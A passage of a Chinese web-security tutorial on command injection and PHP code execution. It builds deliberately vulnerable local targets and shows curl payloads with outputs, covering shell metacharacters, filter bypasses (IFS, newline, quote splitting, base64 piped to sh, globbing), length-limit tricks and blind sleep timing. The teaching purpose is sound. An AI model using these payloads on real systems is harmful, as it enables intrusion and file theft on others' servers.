# W05 命令注入与代码执行
## Command Injection & Code Execution

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W04-SQL注入|W04]] · [[W02-工具链实战与靶场搭建|W02]]
> **本章目标**：分清命令注入与代码执行两条注入路径的边界；掌握 PHP 侧命令执行函数族与代码执行入口的完整行为差异；把 GNU/Linux + bash 的 shell 元字符逐个打穿自建靶；系统过一遍空格、分隔符、黑名单、长度四类过滤的绕过写法；掌握无回显场景下的延时判定、外带与写文件三条路；最后从防御视角说清 escapeshellarg、白名单与"不进 shell"各自的保证范围。

[[11-Web安全版图与Burp#3.3 命令注入：shell 元字符全归你使唤|11 章 3.3]]用 Python 的 `http.server` + `subprocess` 搭过一个最小的在线 ping 靶，并用 `;cat flag.txt` 完成了第一次命令注入。那一节回答的是"这类漏洞存在"；本章回答"这类漏洞怎么系统地打"。同样的靶换到 PHP 上（[[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 起服务，一行启动），原因是 CTF 里命令注入与代码执行题 PHP 占比最高，且 PHP 侧的执行函数族最全，适合把行为差异一次讲清。

和 [[W04-SQL注入|W04]] 的靶场方法相同：自建靶、curl 手工打、每条 payload 配输出。端口用 8500 段。

> [!note] 本章的实验约定
> 所有命令与 shell 行为均按 GNU/Linux 给出。标注"bash 层"的示例在 bash 里直接执行；打靶的示例由 PHP 的 `system()` 执行，它把命令交给 `/bin/sh`（Ubuntu 上是 dash），演示到的全部写法在 dash 下成立，bash 专属写法出现处会单独说明。curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑）；URL 一律用单引号包住，防止本地 shell 抢先解释 `;`、`&`、`#` 这些字符；URL 里的空格、引号、元字符按百分号编码写。

## 1. 两种注入的边界

两类漏洞共用一句话：==本该当数据处理的输入，被当成了代码执行==。差别在被当成哪种代码：

- **命令注入**（Command Injection）：输入拼进一条 **shell 命令**字符串，由 `/bin/sh` 解释。控制的是"shell 命令行"：能追加命令、能改管道和重定向，用的武器是 shell 元字符。
- **代码执行**（Code Execution，常写作 RCE）：输入被当成**宿主语言的代码**执行，比如交给 `eval`。控制的是一门完整语言：赋值、循环、调用任意函数都行，shell 只是它顺手的调用对象之一。

| | 命令注入 | 代码执行 |
| ---- | ---- | ---- |
| 输入进什么 | 一条 shell 命令字符串 | 宿主语言的源代码字符串 |
| 谁来解释 | `/bin/sh`（dash/bash） | PHP/Python/JS 的解释器 |
| 能力上限 | shell 能做的一切：执行命令、读写文件、发网络连接 | 宿主语言能做的一切，含调用命令执行函数 |
| PHP 典型入口 | `system`、`exec`、反引号（第 2 节） | `eval`、可变变量、回调（第 2 节） |
| 典型题面 | "在线 ping"、"DNS 查询"的 IP 参数 | "在线计算器"、把参数当函数名调用 |

能力上限上代码执行包含命令注入（拿到代码执行后调 `system` 即得命令注入），但两者的入口函数、过滤方式、绕过思路不同，所以分开掌握。==判断手里的注入点是哪一类，看输入最终落在哪个函数的参数里==：落在 `system("ping " . $x)` 里是命令注入；落在 `eval("return " . $x . ";")` 里是代码执行。

bash 元字符的语法底子在 [[07-Linux进阶操作与Shell脚本|07 章]]打过；本章第 4 节从攻击视角把它们过一遍。

## 2. PHP 的执行函数族

### 2.1 命令执行：system 一族与反引号

PHP 里能把字符串交给 shell 的函数有六个加一个运算符。行为差异集中在三件事上：==输出去哪了、返回值是什么、stderr 给不给==。

| 调用 | 输出去哪 | 返回值 | 拿全部输出的方式 |
| ---- | ---- | ---- | ---- |
| `system($cmd)` | 逐字节透传进 HTTP 响应 | 最后一行（无输出时 `false`） | 抛不开，边执行边吐 |
| `exec($cmd, $out, $code)` | 默认丢弃 | 最后一行 | 第二参数收进数组，第三参数收退出码 |
| `shell_exec($cmd)` | 不吐，攒进返回值 | 全部 stdout 的字符串 | 返回值本身 |
| `passthru($cmd)` | 逐字节透传（适合二进制） | 无，第二参数收退出码 | 抛不开 |
| `popen($cmd, 'r')` | 不吐，返回文件句柄 | stream 资源 | `stream_get_contents($h)` |
| `proc_open($cmd, $desc, $pipes)` | 不吐，stdin/stdout/stderr 全可控 | 资源，管道数组 | 读管道 |
| 反引号 `` `$cmd` `` | 不吐，攒进返回值 | 同 `shell_exec` | 返回值本身 |

下面一段脚本把前六种逐一对照（反引号与 `shell_exec` 同行为，一并演示）。GNU/Linux + bash：

```bash
php fnfamily.php
```

输出：

```
== system ==
line1
line2
[return] string(5) "line2"
== exec ==
[return] string(5) "line2"
[out 数组] array(2) {
  [0]=>
  string(5) "line1"
  [1]=>
  string(5) "line2"
}
[exit code] int(0)
== shell_exec ==
[return] string(12) "line1
line2
"
== passthru ==
raw-out
[return] NULL
== popen ==
[读回] string(6) "p1
p2
"
== 反引号 ==
[return] string(8) "bt1
bt2
"
== stderr 不进返回值 ==
ls: cannot access '/no/such/file': No such file or directory
[shell_exec 返回] NULL
[shell_exec + 2>&1 返回] string(61) "ls: cannot access '/no/such/file': No such file or directory
"
```

三件事从输出里读出来：

- `system` 是边执行边把 stdout 抄给客户端的，CTF 靶最常见的回显形态就是它；`exec`/`shell_exec` 不主动吐，靶子要不要回显取决于代码拿返回值做了什么。
- ==这六个函数全部只经手 stdout，stderr 一概不进返回值也不透传==。末尾的对照里，`ls` 的报错直接落在了终端（也就是 PHP 进程的 stderr），返回值是 `NULL`；补上 `2>&1` 才收进字符串。这一条是命令注入题第一大坑：payload 明明执行了却"没反应"，多半是输出走了 stderr（第 8 节常见问题表）。

> [!info]- proc_open 补充
> `proc_open` 用描述符数组同时接管 stdin、stdout、stderr 三个管道，能向子进程写输入、分别读两类输出，是六个函数里唯一 stderr 可控的。PHP 侧需要交互式控制子进程时用它；纯拿输出时 `shell_exec` 更省事。它把 stdout 和 stderr 分开接管这件事，恰好印证了其余函数"stderr 不归我管"的共同行为。

### 2.2 代码执行入口

| 入口 | 状态 | 说明 |
| ---- | ---- | ---- |
| `eval($code)` | 可用 | 把字符串当 PHP 执行，无返回值形式时可用 `return` 带值出来 |
| 可变变量 `$_GET['f']($_GET['x'])` | 可用 | 函数名来自输入，直接按名字调用 |
| `call_user_func` / `usort` / `array_map` 回调 | 可用 | 一切接受"可调用（callable）"参数的函数，回调名可控即执行可控 |
| `assert($str)` | PHP 8 起失效 | 7.2 起废弃字符串断言，8.0 起 `assert` 对字符串只做真值判断，不再执行 |
| `preg_replace` 的 `/e` 修饰符 | PHP 7.0 移除 | 历史项：替换串会被当 PHP 执行 |
| `create_function` | PHP 8.0 移除 | 历史项：内部就是 `eval("function …{函数体}")` |

仍可用的四种，用一段脚本对照（GNU/Linux + bash，PHP 8）：

```bash
php codeexec.php
```

输出：

```
== eval ==
[return] int(49)
hua
[eval 执行命令并把返回值带回来] string(3) "hua"
== 可变变量 ==
hua
== call_user_func ==
hua
== array_map 回调 ==
hua
== assert（PHP 8 不再把字符串当代码执行）==
[assert 之后] 这行照常输出，上面没有 executed 字样
```

逐段说明：

- `eval("return 7*7;")` 返回 49——`eval` 里的字符串是完整的 PHP 代码，`return` 把值带出来；`eval("return system('id -un');")` 先执行了命令（第一行 `hua` 是 `system` 透传的），再把 `system` 的返回值作为 `eval` 的值返回。==代码执行拿到手，命令执行是顺手的事==。
- 可变变量 `$_GET['f']($_GET['x'])`：`$_GET['f']` 是字符串 `"system"`，PHP 按名字调用它，参数是 `$_GET['x']`。出题人把函数名和参数都交给输入时，等于交出了任意函数调用权。
- `call_user_func('system', 'id -un')` 与 `array_map('system', ['id -un'])` 是回调型：凡是文档里写"callable"的参数位置，填进来的字符串都会被当函数名。`usort`、`array_filter`、`array_walk` 同理。
- `assert("print('executed via assert');")` 没有执行打印——PHP 8 里它只判断参数是不是真值（非空字符串恒为真）。老题库脚本里的 `assert` 一句话木马在 PHP 8 环境下失效，原因在此。

两个历史项只留背景，不再配演示：`preg_replace('/匹配/e', '执行串', $input)` 曾把替换串当 PHP 代码执行，PHP 7.0 移除了 `/e`，老代码里的等价形态是 `preg_replace_callback`；`create_function('$a', 'return $a;')` 曾按参数和函数体现场拼一个函数，内部就是一次 `eval`，PHP 8.0 移除后改用匿名函数。读 2017 年前的题解和旧靶场会碰到它们，==见到即说明靶子运行在旧版本 PHP 上，历史 payload 可直接试==。

### 2.3 语言对照

本章以 PHP 贯穿，各语言的同类入口如下，"进不进 shell"一列决定了 shell 元字符是否生效：

| 语言 | 命令执行入口 | 是否经 shell | 代码执行入口 |
| ---- | ---- | ---- | ---- |
| PHP | `system` `exec` `shell_exec` `passthru` `popen` `proc_open` 反引号 | 是 | `eval`、可变变量、回调 |
| Python | `os.system` `os.popen` `subprocess.run(shell=True)` | 是 | `eval` `exec` `pickle.loads` |
| Python | `subprocess.run(["ping", host])` 列表参数 | 否 | —— |
| Node.js | `child_process.exec` | 是 | `eval` `Function()` |
| Node.js | `child_process.spawn`/`execFile` | 否 | —— |
| Java | `Runtime.exec` `ProcessBuilder` | 否（按空格切词，非 shell 语义） | 无原生 eval |
| Go | `os/exec` | 否 | 无 |

语言间的规律一致：==有没有 shell，取决于接口收的是"一条字符串"还是"参数数组"==。这条规律是第 7 节防御视角的落点。

## 3. 自建靶：两个 php -S 靶

### 3.1 命令注入靶

靶场一个目录两个文件，`flag.txt` 放在 Web 根里（真实题目里 flag 常在 `/flag`、`/flag.txt`，打完注入的第一件事往往是 `ls /`）：

```
web1/
├── index.php
└── flag.txt          ← 内容 flag{php_p1ng_p0ng}
```

```php
<?php
// index.php —— 命令注入靶（vuln-ping）：host 参数原样拼进 shell 命令
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '127.0.0.1';
$cmd  = "ping -c 1 -W 1 " . $host;          // 漏洞点：拼接，未做任何处理
echo "[exec] " . $cmd . "\n";
system($cmd);
```

与 [[11-Web安全版图与Burp#3.3 命令注入：shell 元字符全归你使唤|11 章 3.3]] 的 Python 靶同一形态，只是 `subprocess.run` 换成了 `system`。启动命令就是 [[W02-工具链实战与靶场搭建|W02]] 里 `php -S` 的用法，注意==先 `cd` 进 Web 根再启动==——`system` 的工作目录继承自 php 进程，相对路径 `flag.txt` 能不能读到取决于此：

```bash
cd web1
php -S 127.0.0.1:8501
```

正常访问：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.033/0.033/0.033/0.000 ms
```

`[exec]` 行是靶子回显的"发给 shell 的完整命令"，对照它和实际输出，能直接看到每条 payload 在 shell 眼里的最终形态——本章所有演示都依赖这行。

### 3.2 代码执行靶

```
web2/
├── calc.php
└── flag.txt          ← 内容 flag{ev4l_1s_d4ng3r}
```

一个"在线计算器"：把用户提交的表达式拼进 `eval`，这是代码执行靶的典型题面：

```php
<?php
// calc.php —— 代码执行靶（在线计算器）：表达式字符串拼进 eval
header('Content-Type: text/plain; charset=utf-8');
$expr = $_GET['c'] ?? '1+1';
$result = eval("return " . $expr . ";");    // 漏洞点：用户输入进 eval
echo "result: " . var_export($result, true) . "\n";
```

```bash
cd web2
php -S 127.0.0.1:8502
```

正常访问与注入：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8502/calc.php?c=7*7'
curl -s --noproxy '*' 'http://127.0.0.1:8502/calc.php?c=system(%27cat%20flag.txt%27)'
```

输出：

```
result: 49
```

```
flag{ev4l_1s_d4ng3r}
result: 'flag{ev4l_1s_d4ng3r}'
```

第二条 payload 的读法：`system('cat flag.txt')` 作为**一个表达式**填进了 `return` 和 `;` 之间。`system` 执行 `cat` 时输出直接透传到响应（第一行），它的返回值（输出的最后一行）又被 `var_export` 打成了第二行。注意 payload 是"表达式"不是"语句"——`eval("return " . $expr . ";")` 的拼接方式决定了提交 `1;system(...)` 会造成语法错误：

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' --noproxy '*' 'http://127.0.0.1:8502/calc.php?c=7*'
```

输出：

```
500 0
```

`c=7*` 让 `eval` 拿到 `return 7*;`，解析失败抛出致命错误，页面 500、响应体为空。打 eval 靶前先看拼接方式，==payload 必须拼成一个合法的整体==；具体的拼接看靶子源码（文件读取、`php://filter` 那是 [[W06-文件包含|W06]] 的主场）或从报错信息反推。

> [!warning] URL 里的 `+` 会被 PHP 当空格
> 查询串按表单编码规则解码，`+` 解成空格。提交 `c=1+2` 时 PHP 收到的是 `1 2`，`eval("return 1 2;")` 照样 500。想在 payload 里表示加号或空格本身，用 `%2B` 和 `%20`。新手在这一步的典型现象是"payload 原样复制别人的却能报错"，原因就是别人的 `+` 过了编码而你没编。

## 4. shell 元字符全集

本节逐个打 3.1 的 ping 靶。为省篇幅，各输出里 ping 自身的回显属重复噪声，不再贴出；每条保留 `[exec]` 行与 payload 产生的内容行。

先上总表，再逐类过一遍：

| 元字符 | shell 语义 | payload 形态 |
| ---- | ---- | ---- |
| `;` | 顺序执行两条命令 | `127.0.0.1;id` |
| `&&` | 前条成功才执行后条 | `127.0.0.1 && id` |
| `\|\|` | 前条失败才执行后条 | `nosuchhost.invalid \|\| id` |
| `\|` | 管道：前条的 stdout 接给后条 | `127.0.0.1 \| id` |
| `&` | 后台：前条转后台，不阻塞 | `127.0.0.1 & id` |
| 换行符 | 与 `;` 等价的命令分隔 | `127.0.0.1%0aid` |
| `$( )` / 反引号 | 命令替换：先执行、结果拼回原命令 | `;echo user=$(whoami)` |
| `#` | 行内注释起头 | `;id #` |
| 引号 | 单引号全字面、双引号保留展开 | `ca''t`、`"$HOME"` |

### 4.1 顺序与条件：; && ||

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%3Bid'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;id
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

`;` 之后的 `id` 照常执行，uid 直接拼在响应里。`%3B` 是 `;` 的编码——**必须编码**，裸写 `;` 会被 PHP 的查询串解析当成分隔符截断参数。后面各 payload 同理：`%26` 是 `&`、`%7C` 是 `|`、`%0a` 是换行、`%60` 是反引号、`%23` 是 `#`。

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%20%26%26%20id%20-un'
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=nosuchhost.invalid%20%7C%7C%20id%20-un'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1 && id -un
hua
```

```
[exec] ping -c 1 -W 1 nosuchhost.invalid || id -un
hua
```

`&&` 版里 ping 成功后 `id -un` 才跑；`||` 版里 ping 必然失败（域名不存在），`id -un` 顶上。`||` 的实战用法：不确定前半段成败时，用它做"无条件兜底"。注意 `||` 版的输出里==没有 ping 的报错信息==——ping 对不存在域名的抱怨走的是 stderr，`system` 不透传（[[#2.1 命令执行：system 一族与反引号|2.1]]），看不到不代表没执行。

### 4.2 管道与后台：| &

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%20%7C%20id%20-un'
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%20%26%20id%20-un'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1 | id -un
hua
```

```
[exec] ping -c 1 -W 1 127.0.0.1 & id -un
hua
```

管道版里 ping 的 stdout 全部喂给了 `id`，所以响应里只剩 `hua`，ping 的统计一行不见。`&` 让 ping 转后台、shell 立刻执行 `id`；本条里 ping 一毫秒级就结束了，两条输出先后落进响应，==`&` 之下两条命令的输出顺序不保证==，交叉、缺行都可能。

### 4.3 换行与注释：换行符与井号

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%0aid%20-un'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1
id -un
hua
```

`[exec]` 行的换行是真的——`%0a` 解码成一个换行字节进了 `$cmd`，shell 把它当命令分隔符，与 `;` 等价。它的价值在 5.2 节：当 `;`、`&`、`|` 全被过滤时，换行往往还活着。

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%3Bid%20-un%20%23'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;id -un #
hua
```

`#` 从它出现处（含前导空白）注释到行尾。注入点在命令**中间**、后面还有程序拼死的固定内容时（比如 `ping $host -c 4`），用 ` #` 把后半段注释掉是标准解法。bash 层再看一遍它的配对语义：

```bash
echo a#b
echo a #b
```

输出：

```
a#b
a
```

`#` 必须在"词首"才起注释作用，`a#b` 里的 `#` 是普通字符。

> [!warning] `#` 必须写成 `%23`
> `#` 在 URL 语法里是 fragment 起始符，curl 会把其后内容整个截掉再发请求。payload 里的 `#` 不编码，靶子根本收不到——现象是"payload 少了后半截"。同类坑：`&` 不编码会被当成下一个查询参数的分隔符。

### 4.4 命令替换：$() 与反引号

前几类是"追加命令"，命令替换是另一种能力：==先把替换体内的命令执行掉，把输出拼回原命令==。替换结果可以塞进任何位置——参数、文件名、甚至塞给下一条命令当输入：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%3Becho%20user%3D%24%28whoami%29'
curl -s --noproxy '*' 'http://127.0.0.1:8501/index.php?host=127.0.0.1%3Bcat%20%60echo%20flag.txt%60'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;echo user=$(whoami)
user=hua
```

```
[exec] ping -c 1 -W 1 127.0.0.1;cat `echo flag.txt`
flag{php_p1ng_p0ng}
```

第二条里反引号先算出 `flag.txt`，再把它拼给 `cat`。替换的实战价值：当黑名单拦 `cat`、`flag` 这类词时，`c$(y)at`、`` fl`echo a`g `` 这类把禁词拆开重组的写法走的就是替换通道（5.3 节）。

### 4.5 引号语义

bash 层两条命令看清单双引号的差别：

```bash
echo "$HOME"
echo '$HOME'
```

输出：

```
/home/hua
$HOME
```

==双引号内变量和命令替换照常展开，单引号内一切字面==。对注入的两层含义：其一，payload 里的引号是 shell 语法的一部分，`ca''t`、`c"a"t` 之类"夹断"写法（5.3 节）靠的就是引号在词中间合法存在；其二，程序侧若用引号包参数（`ping "$host"`），你的引号要和它的配对，数错一个引号整条 payload 的语义就变了。

## 5. 过滤与绕过全集

真实题目不会把 `system` 裸给你，会先过滤。过滤靶都在 `web4`、`web5` 两个目录，结构与 3.1 相同（各带同名 `flag.txt`，`web4` 内容为 `flag{by_p4ss_th3_w0rd}`，`web5` 为 `flag{sh0rt_cmd_pwn}`），分别监听 8505、8507：

```bash
cd web4 && php -S 127.0.0.1:8505
cd web5 && php -S 127.0.0.1:8507
```

过滤靶的骨架一致，只有过滤条件不同：

```php
<?php
// f_space.php —— 过滤靶：空格被禁（f_sep / f_cat / len 只换过滤条件）
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '';
if (str_contains($host, ' ')) {
    http_response_code(400);
    echo "blocked: space\n";
    exit;
}
$cmd = "ping -c 1 -W 1 " . $host;
echo "[exec] " . $cmd . "\n";
system($cmd);
```

先看一条被拦的样子，确认过滤在工作：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_space.php?host=127.0.0.1%3Bcat%20flag.txt'
```

输出：

```
blocked: space
```

### 5.1 空格被滤

空格是最常被过滤的字符，四条主流替身逐个试：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_space.php?host=127.0.0.1%3Bcat%24%7BIFS%7Dflag.txt'
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_space.php?host=127.0.0.1%3Bcat%24IFS%249flag.txt'
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_space.php?host=127.0.0.1%3Bcat%09flag.txt'
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_space.php?host=127.0.0.1%3Bcat%3Cflag.txt'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;cat${IFS}flag.txt
flag{by_p4ss_th3_w0rd}
```

```
[exec] ping -c 1 -W 1 127.0.0.1;cat$IFS$9flag.txt
flag{by_p4ss_th3_w0rd}
```

```
[exec] ping -c 1 -W 1 127.0.0.1;cat	flag.txt
flag{by_p4ss_th3_w0rd}
```

```
[exec] ping -c 1 -W 1 127.0.0.1;cat<flag.txt
flag{by_p4ss_th3_w0rd}
```

四条原理各一句：

- `${IFS}`：`IFS` 是 shell 的内部字段分隔符，默认值就含空格、制表符、换行，展开后起到分隔作用；
- `$IFS$9`：`$9` 是第九个位置参数，脚本环境里为空，用它在 `IFS` 后面补个"空内容"，绕的是把 `$IFS` 也一并过滤的黑白名单；
- `%09`：制表符的 URL 编码，解码后是真 TAB 字节，shell 视其为空白符；
- `<`：输入重定向，`cat<flag.txt` 与 `cat flag.txt` 等价，用重定向符顶替空格。

第三条输出的 `[exec]` 行里 `cat` 与 `flag.txt` 之间隔着一个 TAB——原样回显的 `$cmd` 让你直接确认了进 shell 的是什么。

### 5.2 分隔符被滤

`f_sep.php` 的过滤是 `preg_match('/[;&|`]|\$\(/', $host)`——`;`、`&`、`|`、反引号、`$(` 全禁。分隔符被抽走后命令拼不进去，但 shell 认的命令分隔符不止这些：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_sep.php?host=127.0.0.1%3Bid%20-un'
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_sep.php?host=127.0.0.1%0aid%20-un'
```

输出：

```
blocked: separator
```

```
[exec] ping -c 1 -W 1 127.0.0.1
id -un
hua
```

换行是 POSIX shell 的合法命令分隔符，`%0a` 直接穿透。配合 5.1 的 `%09`，==过滤正则必须把控制字符也算上才算完整==，漏一类就漏一条路。

### 5.3 命令黑名单

`f_cat.php` 只禁一个词：`cat`。黑名单永远拦不完读文件的路：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Bcat%20flag.txt'
```

输出：

```
blocked: cat
```

**写法一：变量拼接。** 把禁词拆进变量，用的时候再拼回来：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Ba%3Dca%3Bb%3Dt%3B%24a%24b%20flag.txt'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;a=ca;b=t;$a$b flag.txt
flag{by_p4ss_th3_w0rd}
```

`a=ca;b=t;$a$b flag.txt`：前两条赋值，第三条里 `$a$b` 展开成 `cat`。黑名单查的是明文 `cat`，查不到拼出来的。读文件同理可拆 `flag`：`a=fl;b=ag.txt;$a$b`。

**写法二：引号夹断。** 引号在词中间合法存在，空引号不改变词的内容：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Bca%27%27t%20flag.txt'
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Bc%22a%22t%20flag.txt'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;ca''t flag.txt
flag{by_p4ss_th3_w0rd}
```

```
[exec] ping -c 1 -W 1 127.0.0.1;c"a"t flag.txt
flag{by_p4ss_th3_w0rd}
```

`ca''t` 是 `ca`、空串、`t` 三段拼接，shell 拼完仍是 `cat`。4.4 节的命令替换同理可插：`c$(y)at`、`` c`echo a`at `` 都不是明文 `cat`。

**写法三：base64。** 整条命令编码后转运，落地时解码交给 shell：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Becho%20Y2F0IGZsYWcudHh0%7Cbase64%20-d%7Csh'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;echo Y2F0IGZsYWcudHh0|base64 -d|sh
flag{by_p4ss_th3_w0rd}
```

`Y2F0IGZsYWcudHh0` 是 `cat flag.txt` 的 base64。`echo 编码 | base64 -d | sh` 这条管线的意思是：解码出命令文本，直接当脚本执行。黑名单连 `sh` 也禁时换成 `bash`；禁了管道就用 `$(printf …)` 拼接。==编码类绕过对黑名单几乎万能，对"编码函数也被禁"无解==——攻防都在提高对方成本。

**写法四：通配符。** 文件名不写全，让 shell 的 glob 替你补：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3B/bin/%3Fat%20flag.txt'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;/bin/?at flag.txt
flag{by_p4ss_th3_w0rd}
```

`?` 匹配单个任意字符，`/bin/?at` 由 shell 展开成 `/bin/cat` 再执行——注意是 **shell** 做的展开，程序和白名单都看不到 `cat` 三个字。`*` 匹配任意长：`/bin/c*` 同样命中。

> [!warning] 通配符会全量展开，先用 echo 看命中
> 模式匹配到几个文件，就展开成几个路径，按字母序第一个当命令、其余进参数。这台环境下的两个常见写法：
>
> ```bash
> echo /bin/c?t
> echo /???/??t
> ```
>
> 输出：
>
> ```
> /bin/cat /bin/cut
> /bin/apt /bin/cat /bin/cut /bin/fmt /bin/git /dev/net /etc/apt /etc/opt /etc/rmt /lib/apt /var/opt
> ```
>
> `/bin/c?t` 命中 cat 和 cut 两个，执行时会变成 `/bin/cat /bin/cut flag.txt`——cut 这个 ELF 二进制被 cat 打到输出里，一片乱码里混着 flag；`/???/??t` 更是展开出十一条路径，第一条 `/bin/apt` 当命令直接失败。==用通配符前先在 bash 里 `echo 模式` 看展开结果，确认第一个命中是你要的命令==。

**写法五：换读法。** 读文件不止 `cat`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8505/f_cat.php?host=127.0.0.1%3Bmore%20flag.txt'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1;more flag.txt
::::::::::::::
flag.txt
::::::::::::::
flag{by_p4ss_th3_w0rd}
```

`more`、`less`、`tac`（倒序）、`nl`（带行号）、`head`、`tail`、`od`（十六进制）、`base64 flag.txt`（编码输出）都能读到内容，多数还自带不同的输出形态，恰好兼作回显变形。

### 5.4 长度受限

`len.php` 把参数限在 7 字符，超长直接拒绝：

```php
<?php
// len.php —— 过滤靶：参数长度限 7 字符
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '';
if (strlen($host) > 7) {
    http_response_code(400);
    echo "blocked: too long\n";
    exit;
}
$cmd = "ping -c 1 -W 1 " . $host;
echo "[exec] " . $cmd . "\n";
system($cmd);
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8507/len.php?host=%3Bcat%20flag.txt'
```

输出：

```
blocked: too long
```

`;cat flag.txt` 共 13 字符。**第一步：短命令 + 通配符**。`*` 免费替你省下文件名长度：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8507/len.php?host=%3Bcat%20f*'
```

输出：

```
[exec] ping -c 1 -W 1 ;cat f*
flag{sh0rt_cmd_pwn}
```

`;cat f*` 恰好 7 字符。glob 展开发生在 shell 侧，等价于 `cat flag.txt`；`[exec]` 行里 ping 自己连主机名都没拿到（`;` 之前的 `ping -c 1 -W 1` 空跑失败，stderr 没进响应），但不影响后条执行。通配符的粒度要匹配目录内容——本靶 Web 根里只有 `len.php` 和 `flag.txt`，`f*` 只会命中后者；==文件名相近时精确写 `fl*`，别把源码文件一起读出来==。

**第二步：命令装进文件名**。限长再收紧、短命令也写不下时，换一条思路：`>` 重定向可以直接造文件，文件名里允许空格与任意字符；配合 glob，文件名自己拼成命令行。bash 层演示这套机制（GNU/Linux + bash）：

```bash
rm -rf /tmp/w05stage && mkdir -p /tmp/w05stage && cd /tmp/w05stage
echo 'flag{stage_pwn}' > flag.txt
>cat
ls
*
```

输出：

```
cat
flag.txt
flag{stage_pwn}
```

三步的机制：`>cat` 造出名为 `cat` 的空文件（4 字符）；`ls` 确认现场；`*` 展开成 `cat flag.txt`——==glob 排序后第一个文件名当命令，其余当参数==，两条 4 字符以内的"命令"完成了一次 `cat flag.txt`。==`>` 重定向可以直接造文件，文件名里允许空格与任意字符；名字一旦落成文件就是数据，不再占后续命令的长度预算==。经典变体是把各段命令分别藏进多个文件名、跨多次请求逐个创建，再用 `ls -t>g`（按时间排序写入文件 `g`）把文件名清单收成脚本、`sh g` 执行——更紧的限长场景下还会配合从远端下载，让 payload 文本搭着 URL 的顺风进来。限长题的通用思路一句话：==命令的"字符预算"花在结构上，内容全部外包给 glob、变量和文件名==。

## 6. 无回显 RCE

到这为止的靶子都把命令输出透传进响应。真实题目更常见的是**盲打**：命令执行了，但页面上什么都没有。第三种靶子 `web3/blind.php` 监听 8503：

```php
<?php
// blind.php —— 无回显靶：命令执行，但不回传任何输出
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '127.0.0.1';
system("ping -c 1 -W 1 " . $host . " > /dev/null 2>&1");
echo "done\n";
```

`flag.txt`（内容 `flag{sl33p}`）同样在 Web 根里。命令被 `> /dev/null 2>&1` 整个吞掉，页面永远只有一行 `done`：

```bash
cd web3
php -S 127.0.0.1:8503
curl -s --noproxy '*' 'http://127.0.0.1:8503/blind.php?host=127.0.0.1'
```

输出：

```
done
```

无回显不等于无信息。三条路按成本从低到高：延时判定、逐字符还原、数据外带。

### 6.1 延时判定

命令执行与否，先用时间量出来。curl 的 `-w '%{time_total}'` 打出整次请求的秒数：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:8503/blind.php?host=127.0.0.1'
curl -s --noproxy '*' -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:8503/blind.php?host=127.0.0.1%3Bsleep%203'
curl -s --noproxy '*' --max-time 2 'http://127.0.0.1:8503/blind.php?host=127.0.0.1%3Bsleep%2010'
echo "curl exit=$?"
```

输出：

```
0.002356
```

```
3.004581
```

```
